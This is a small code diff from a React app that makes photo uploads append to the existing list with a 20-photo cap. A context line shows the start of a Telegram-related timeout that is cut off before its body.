@@ -202,7 +202,8 @@ export default function App() {
   };
 
   const handlePhotosUpload = (photos: string[]) => {
-    setUploadedPhotos(photos);
+    // Append new photos to existing ones (limit to 20 for performance)
+    setUploadedPhotos((prev) => [...prev, ...photos].slice(0, 20));
 
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && photos.length > 0) {
       setTimeout(async () => {
